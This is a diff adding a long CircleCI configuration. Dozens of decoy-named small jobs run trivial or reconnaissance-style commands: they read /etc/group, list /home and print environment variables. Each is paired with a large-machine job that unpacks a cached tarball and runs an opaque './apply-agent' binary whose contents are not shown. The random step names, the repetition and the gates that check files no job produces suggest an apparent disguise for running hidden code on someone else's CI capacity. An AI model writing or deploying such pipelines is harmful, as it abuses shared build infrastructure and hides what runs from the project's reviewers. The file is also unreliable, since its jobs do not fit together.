@@ -1,0 +1,1493 @@
+version: 2.1
+
+jobs:
+  M:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture v2
+          command: |
+            mkdir -p /tmp/indir
+            set +o pipefail 2>/dev/null; date +%s%N > /tmp/indir/c847b37e-d462; sleep 0.1; date +%s%N >> /tmp/indir/c847b37e-d462; seq 1 2000 >> /tmp/indir/c847b37e-d462; true
+            sha1sum /tmp/indir/c847b37e-d462 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'c847b37e-d462'
+  fx-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/c847b37e-d462 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  HOST_PASS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: load the loading bay mark 29
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; grep URL /etc/os-release | awk -F= '{print $2}' | wc -l; true ; } > /tmp/indir/trial_241
+            sha1sum /tmp/indir/trial_241 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'trial_241'
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/trial_241 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  Receive-AIKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: tunneling wifi mesh now
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 3 -type f -newermt 2015-12-31 -exec ls -1 {} + 2>/dev/null | wc -l; true ; } > /tmp/indir/cyyxcvuiid
+            sha1sum /tmp/indir/cyyxcvuiid | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'cyyxcvuiid'
+  pr-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/cyyxcvuiid > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  scale_Config-repo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Tomorrow bake the level
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 1 -name "std*" | wc -l; true ; } > /tmp/indir/theta_titan_garden_flame
+            sha1sum /tmp/indir/theta_titan_garden_flame | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'theta_titan_garden_flame'
+  fx-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/theta_titan_garden_flame > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  card__track__bold:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: notification after reminder
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; ls -lr --full-time /home | nl; true ; } > /tmp/indir/20221124_172510
+            sha1sum /tmp/indir/20221124_172510 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '20221124_172510'
+  aug4-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  Psi_grad:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Phase IV chapter marker compression
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; printf '%s\n' fox seal cat crow whale | awk '{print length($0), $0}' | sort -rn | head -n 1; true ; } > /tmp/indir/hawk.proton.driver.engine
+            sha1sum /tmp/indir/hawk.proton.driver.engine | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'hawk.proton.driver.engine'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  theTempo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Else kick off the batch window
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'CamelCaseName' | sed s:CamelCaseName::g; true ; } > /tmp/indir/20211109_165620
+            sha1sum /tmp/indir/20211109_165620 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '20211109_165620'
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/20211109_165620 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  freshQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Initiate labeling for the extraction kit
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; cat /etc/profile | grep -n then | sort -u; true ; } > /tmp/indir/TXN_006593
+            sha1sum /tmp/indir/TXN_006593 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'TXN_006593'
+  CORE-794:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/TXN_006593 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  EXPORT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Recording From Denver
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; echo -n "are we there yet?" | b2sum; true ; } > /tmp/indir/68.144.139
+            sha1sum /tmp/indir/68.144.139 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '68.144.139'
+  v1-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  q4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: The enzyme mix is sealed by Bea
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; banner() { echo "[$(date +%T)] $*"; }; banner 'back in 5'; true ; } > /tmp/indir/ApqH71LrkpZjSFPC
+            sha1sum /tmp/indir/ApqH71LrkpZjSFPC | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'ApqH71LrkpZjSFPC'
+  feb22-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/ApqH71LrkpZjSFPC > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  tax-domino:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: purge pdfs
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; printf '%s\n' '3 tests passed' | cat -A; true ; } > /tmp/indir/spark_wave
+            sha1sum /tmp/indir/spark_wave | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'spark_wave'
+  CORE-531:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/P00079246 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  reAddressCanvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: really final
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; echo "v0.9-beta" | tr ' ' '\n' | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | paste -sd ' '; true ; } > /tmp/indir/h
+            sha1sum /tmp/indir/h | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'h'
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/P00079246 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  retryScanner:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture v2
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 2 -type f -exec wc -c {} ';' 2>/dev/null |sort |head -n20; true ; } > /tmp/indir/willow.canyon
+            sha1sum /tmp/indir/willow.canyon | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'willow.canyon'
+  q1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/willow.canyon > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  OSCAR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Probe the antenna at 500 per sec
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; if test -x /bin/sh; then echo present; elif test -e /tmp; then echo maybe; else echo absent; fi; true ; } > /tmp/indir/temp-e2b
+            sha1sum /tmp/indir/temp-e2b | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'temp-e2b'
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  sphereLink_complex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Vanquish specimen tray
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; touch "${TMPDIR:-/tmp}/groceries.log" && ls -i "${TMPDIR:-/tmp}/groceries.log"; true ; } > /tmp/indir/iZ
+            sha1sum /tmp/indir/iZ | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'iZ'
+  dp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  guardsetup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Properly warm the TLS certs
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; for k in orange mango kiwi banana plum grape; do echo "item: $k"; done|tac; true ; } > /tmp/indir/dm0Km6BV
+            sha1sum /tmp/indir/dm0Km6BV | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'dm0Km6BV'
+  pat-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/dm0Km6BV > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  y_train:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: 60 package the artifact registry
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; cat /etc/group | sort -t: -k 3 -n; true ; } > /tmp/indir/bxopj4o9fu
+            sha1sum /tmp/indir/bxopj4o9fu | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'bxopj4o9fu'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  beastStats:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Coda
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; cat /etc/skel/.profile | tr -cs '[:alnum:]' '\n'; true ; } > /tmp/indir/MAPPER_SILENT
+            sha1sum /tmp/indir/MAPPER_SILENT | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'MAPPER_SILENT'
+  DEV_STAGE_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/MAPPER_SILENT > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  ConcreteSymbolAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Quest for month end
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; cut -c1-10 /etc/os-release | head -5; true ; } > /tmp/indir/lagoon876
+            sha1sum /tmp/indir/lagoon876 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'lagoon876'
+  november-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/lagoon876 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  GraphViewMotor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Flag the chargebacks
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; env | head -n 5 | sort; true ; } > /tmp/indir/stage_8993
+            sha1sum /tmp/indir/stage_8993 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'stage_8993'
+  wip-session-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/stage_8993 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  TME-OWED-C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Is the cycle count up
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | sed 's/=.*//' | tac; true ; } > /tmp/indir/20.06.2016
+            sha1sum /tmp/indir/20.06.2016 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '20.06.2016'
+  assemble-partial-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  nullsub_99:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Go around on the whole company
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; find /var/log \( -name '*log*' -o -name '*.gz' \) -exec echo {} ';' 2>/dev/null | xargs ls -ld; true ; } > /tmp/indir/40d346c1
+            sha1sum /tmp/indir/40d346c1 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '40d346c1'
+  q3-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/P00079246 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  subPointer9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Critical mux
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; awk -F ":" '{print $1, $3}' /etc/group | expand -t 6; true ; } > /tmp/indir/7cf4e7
+            sha1sum /tmp/indir/7cf4e7 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - '7cf4e7'
+  APP-365:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/7cf4e7 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  aki2k:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Tokenize the inference server fp16
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; grep -rc bash /etc/default 2>/dev/null | nl | head -n 8; true ; } > /tmp/indir/lagoonfilter
+            sha1sum /tmp/indir/lagoonfilter | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'lagoonfilter'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/lagoonfilter > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  warning_sanitize_window:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture v2
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; expr length "can't stop now"; true ; } > /tmp/indir/PO_097760
+            sha1sum /tmp/indir/PO_097760 | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'PO_097760'
+  build-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/PO_097760 > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  ms_arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Weigh anchor
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; (trap 'echo cleaning up' EXIT; echo 'retrying in 5 seconds'); true ; } > /tmp/indir/crc_a275d6c
+            sha1sum /tmp/indir/crc_a275d6c | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'crc_a275d6c'
+  rust-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/crc_a275d6c > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
+          command: git clone --depth 5 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack cached data
+          command: tar -xz -f snapshot-stockpile.tgz
+      - run:
+          command: "./apply-agent"
+  tb_task_bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Capture the CDN cache to avoid surprises
+          command: |
+            mkdir -p /tmp/indir
+            { set +o pipefail 2>/dev/null; ps -ef|awk 'NR>1 {print $1}'|tail -2|grep -c .; true ; } > /tmp/indir/PRoXywilloWtHUndErKAPPa
+            sha1sum /tmp/indir/PRoXywilloWtHUndErKAPPa | awk '{print "sha1-a:",$1}'
+      - persist_to_workspace:
+          root: /tmp/indir
+          paths:
+            - 'PRoXywilloWtHUndErKAPPa'
+  v1-ga4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/indir
+      - run:
+          name: Verify gate output
+          command: |
+            { head -n 50 /tmp/indir/bxopj4o9fu > /dev/null; echo "head50 ok" ; } || true
+      - run:
+          name: Get fresh code
